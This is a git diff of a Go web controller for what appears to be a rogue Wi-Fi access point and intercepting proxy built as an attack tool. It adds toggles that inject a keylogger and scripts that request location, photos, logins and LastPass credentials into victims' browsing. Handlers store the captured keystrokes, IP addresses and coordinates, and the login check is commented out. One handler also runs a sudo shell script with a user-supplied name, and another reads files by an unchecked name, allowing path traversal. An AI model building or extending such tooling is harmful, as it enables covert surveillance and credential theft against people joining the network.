@@ -3,9 +3,9 @@ package controllers
 import (
 	"github.com/revel/revel"
 	"log"
-	// "io/ioutil"
-	// "os"
-	// "path/filepath"
+	"io/ioutil"
+	"os/exec"
+	"path/filepath"
 	"time"
 	"strings"
 )
@@ -16,46 +16,16 @@ import (
 
 const (
     PASSWORD = "whitesilence"
+    SECURE = false
 )
 
 //the temporary object that stores the logged data.
 //probably should store to file for persistence
-var keylogs []KeyLog
-var locations []Location
-var password string
-//key logger object
-type KeyLog struct {
-	Page string //what page they were on when they typed it
-	IP string //which client typed it
-	Content string //what was typed
-	Timestamp string //the time at which it was typed
-	DomObject string //where the data was typed
-}
-type Location struct {
-	IP string
-	Latitude string
-	Longitude string
-	Timestamp string
-}
-/*
-struct for storing result from a filePath Walker
-so that can return it to the user.
-*/
-type Walker struct {
-	files []string
-}
 
 type App struct {
 	*revel.Controller
 }
 
-var globalProxyStandard bool
-
-
-// -----------------------------------------------------------------------------------------
-
-
-//
 func (c App) Login() revel.Result {
 	var p string
 	c.Params.Bind(&p, "password")
@@ -69,23 +39,49 @@ func (c App) Login() revel.Result {
 
 //
 func (c App) Index() revel.Result {
-	// Simple password checker
-	//if password == PASSWORD {
-		// Set proxy off by default
-		globalProxyStandard = false
-		log.Println("Initialising 'globalProxyStandard' as ", globalProxyStandard )
-		log.Println("Initialising 'globalRedirects' as ", globalRedirects )
-		globalProxyStandard = true
-		listener = StartSimpleProxy()
-		//
-		setFileStorageLocation()
-		getPages()
-		getRedirectUrls()
-		getBannedUrls()
-		return c.Render()
-	//} else {
-		//return c.Redirect("/App/Login")	
-	//}
+	
+	// if !SECURE { //for debugging set to false
+		// simple password checker
+		// if password == PASSWORD {
+			// Set proxy off by default
+			KillProxy()
+			
+			//reset proxy style
+			globalStoreHAR = false		
+			globalProxyStandard = false
+			globalRedirects = false
+			globalBlocks = false
+			globalWolfPack = false
+			
+			//reset scripts
+			globalInjectKeyLogger = false
+			globalInjectGetLocation  = false
+			globalInjectGetPhoto = false
+			globalInjectGetLogin = false
+			globalInjectLastpass = false
+
+			//set basic proxy to true
+			globalProxyStandard = true
+			log.Println("Initialising 'globalProxyStandard' as ", globalProxyStandard )
+			log.Println("Initialising 'globalRedirects' as ", globalRedirects )
+			
+			StartSimpleProxy()
+
+			//set the location for files
+			setFileStorageLocation()
+			//get the redirect pages from server
+			getPages()
+			//get a list of urls to redirect
+			getRedirectUrls()
+			//get a list of urls to block
+			getBannedUrls()
+			return c.Render()
+	// 	} else {
+	// 		return c.Redirect("/App/Login")	
+	// 	}
+	// } else {
+	// 	return c.Render()
+	// }
 }
 
 // 
@@ -95,21 +91,23 @@ func (c App) StartSimpleProxy() revel.Result {
 	// If the proxy was off, start a new one.
 	if globalProxyStandard == false {
 		globalProxyStandard = true
-		listener = StartSimpleProxy()
+		StartSimpleProxy()
+		log.Println("Proxy started")
 		return c.RenderJson("{Proxy:'Started'}")
 	} else {
 		globalProxyStandard = false
-		//log.Println(listener)
 	}
 	// Return 
+	log.Println("Proxy shutting down")
 	return c.RenderJson("{Proxy:'Shutdown'}")
 }
 
 // Function to kill the proxy.
 func KillProxy() {
-	log.Println(" *** TRYING TO STOP THE PROXY SERVER")
 	if listener != nil {
 		listener.Close()
+		log.Println("waiting for socket to close")
+		time.Sleep(2 * time.Second)
 	}
 }
 
@@ -124,7 +122,7 @@ func (c App) TriggerRedirects() revel.Result {
 		log.Println(" --- OPTION: Turning off redirects")
 	}
 	KillProxy()
-	listener = StartSimpleProxy()
+	StartSimpleProxy()
 	return c.RenderJson(redirect) // Return list of redirects.
 }
 
@@ -139,11 +137,10 @@ func (c App) TriggerBlocks() revel.Result {
 		log.Println(" --- OPTION: Turning off blocking")
 	}
 	KillProxy()
-	listener = StartSimpleProxy()
+	StartSimpleProxy()
 	return c.RenderJson(banned) // Return list of redirects.
 }
 
-//
 func (c App) TriggerWolfPack() revel.Result {
 	if globalWolfPack == false {
 		globalWolfPack = true
@@ -153,7 +150,7 @@ func (c App) TriggerWolfPack() revel.Result {
 		log.Println(" --- OPTION: Turning off wolf-pack-hack")
 	}
 	KillProxy()
-	listener = StartSimpleProxy()
+	StartSimpleProxy()
 	return c.RenderJson("") // Return list of redirects.
 }
 
@@ -172,15 +169,132 @@ func (c App) TriggerInjection() revel.Result {
 			globalInjectKeyLogger = false
 			log.Println(" --- OPTION: Turning off key-logger")
 		}
-	}
-	//
+	} else if trigger == "getlocation" {
+		if globalInjectGetLocation == false {
+			globalInjectGetLocation = true
+			log.Println(" --- OPTION: Turning on Location Request")
+		} else {
+			globalInjectGetLocation = false
+			log.Println(" --- OPTION: Turning on Location Request")
+		}
+	} else if trigger == "takephoto" {
+		if globalInjectGetPhoto == false {
+			globalInjectGetPhoto = true
+			log.Println(" --- OPTION: Turning on Photo Request")
+		} else {
+			globalInjectGetPhoto = false
+			log.Println(" --- OPTION: Turning on Photo Request")
+		}
+	} else if trigger == "requestlogin" {
+		if globalInjectGetLogin == false {
+			globalInjectGetLogin = true
+			log.Println(" --- OPTION: Turning on Login Request")
+		} else {
+			globalInjectGetLogin = false
+			log.Println(" --- OPTION: Turning on Login Request")
+		}
+	} else if trigger == "requestlasspass" {
+		if globalInjectLastpass == false {
+			globalInjectLastpass = true
+			log.Println(" --- OPTION: Turning on Login Request")
+		} else {
+			globalInjectLastpass = false
+			log.Println(" --- OPTION: Turning on Login Request")
+		}
+	} 
 	KillProxy()
-	listener = StartSimpleProxy()
+	StartSimpleProxy()
 	return c.RenderJson("")
 }
 
+func (c App) CreateAccessPoint() revel.Result {
+	var apName string
+	c.Params.Bind(&apName, "name")
 
-// -----------------------------------------------------------------------------------------
+	cmd := exec.Command("sudo", "/srv/wifi/beagleattach.sh", "eth0", apName)
+	output, _ := cmd.CombinedOutput()
+	return c.RenderJson(output)
+}
+
+
+func (c App) GetLocations() revel.Result {
+	return c.RenderJson(locations)
+}
+func (c App) CatchLocation() revel.Result {
+	var lat string
+	var lon string
+	c.Params.Bind(&lat, "latitude")
+	c.Params.Bind(&lon, "longitude")
+	var l Location
+	l.Latitude = lat
+	l.Longitude = lon
+	t := time.Now().Local()
+	l.Timestamp = t.Format("20060102150405")
+	s := strings.Split(c.Request.RemoteAddr, ":")
+	ip := s[0]
+	l.IP = ip
+	locations = append(locations, l)
+	return c.RenderJson("location updated")
+}
+
+
+func (c App) GetKeylogs() revel.Result {
+	return c.RenderJson(keylogs)
+}
+
+func (c App) CatchKeyLog() revel.Result {
+	var d string
+	var p string
+	c.Params.Bind(&d, "data")
+	c.Params.Bind(&p, "page")
+	if d != "" {
+		var k KeyLog
+		k.Page = p
+		k.Content = d
+		t := time.Now().Local()
+		k.Timestamp = t.Format("20060102150405")
+		s := strings.Split(c.Request.RemoteAddr, ":")
+		ip := s[0]
+		k.IP = ip
+		keylogs = append(keylogs, k)
+		return c.RenderJson("logger updated")
+	}
+	return c.RenderJson("null")
+}
+
+func (c App) GetHars() revel.Result {
+	var fileNames []string
+	log.Println("reading hars from: ", fileLocation+"/hars/")
+	files, err := ioutil.ReadDir(fileLocation+"/hars/")
+	if err != nil {
+		log.Println("error: ", err)
+	}
+	for _, f := range files {
+		log.Println(f.Name())
+        fileNames = append(fileNames, f.Name())
+    }
+	return c.RenderJson(fileNames)
+}
+
+func (c App) GetHar() revel.Result {
+	var harName string
+	c.Params.Bind(&harName, "harname")
+    data, err := ioutil.ReadFile(fileLocation+"/hars/"+harName)
+    log.Println("location: ", fileLocation+"/hars/"+harName)
+    if err != nil {
+    	return c.RenderJson("The file may not exist...")
+    }
+    return c.RenderJson(string(data))
+}
+func (c App) DeleteHars() revel.Result {
+	var w Walker
+	filepath.Walk(fileLocation+"/hars", w.utilsDeletefiles)
+	return c.RenderJson(w.files)
+}
+
+
+
+ // -----------------------------------------------------------------------------------------
 
 
 
@@ -204,30 +318,6 @@ func (c App) TriggerInjection() revel.Result {
 // 	listener = InjectScript(replace, result)
 // 	return c.RenderJson("")
 // }
-
-func (c App) GetKeylogs() revel.Result {
-	return c.RenderJson(keylogs)
-}
-
-func (c App) AppendData() revel.Result {
-	var d string
-	var p string
-	c.Params.Bind(&d, "data")
-	c.Params.Bind(&p, "page")
-	if d != "" {
-		var k KeyLog
-		k.Page = p
-		k.Content = d
-		t := time.Now().Local()
-		k.Timestamp = t.Format("20060102150405")
-		s := strings.Split(c.Request.RemoteAddr, ":")
-		ip := s[0]
-		k.IP = ip
-		keylogs = append(keylogs, k)
-		return c.RenderJson("logger updated")
-	}
-	return c.RenderJson("null")
-}
 
 // func (c App) GetLocations() revel.Result {
 // 	return c.RenderJson(locations)
@@ -259,36 +349,8 @@ func (c App) AppendData() revel.Result {
 
 // //annoying cant use the file walker here - seems to have different header if I do
 // //which means it gets downloaded rather than displayed
-// func (c App) GetHars() revel.Result {
-// 	var fileNames []string
-// 	log.Println("reading hars")
-// 	files, err := ioutil.ReadDir(fileLocation+"/hars/")
-// 	if err != nil {
-// 		log.Println("error: ", err)
-// 	}
-// 	for _, f := range files {
-// 		log.Println(f.Name())
-//         fileNames = append(fileNames, f.Name())
-//     }
-// 	return c.RenderJson(fileNames)
-// }
-// func (c App) DeleteHars() revel.Result {
-// 	var w Walker
-// 	filepath.Walk(fileLocation+"/hars", w.deletefiles)
-// 	return c.RenderJson(w.files)
-// }
 
 
 
-//  func (w *Walker) deletefiles(path string, f os.FileInfo, err error) (e error) {
 
-//  	//must check for the directory otherwise end up deleting it!
-//  	if !f.Mode().IsDir() {
-//  		 log.Println(path)
-//  		 w.files = append(w.files, path)
-//  	}
 
-//  	//put this back in when you actually do want to clear the currently collected list
-//  	// os.Remove(path)
-//  	return
-//  }
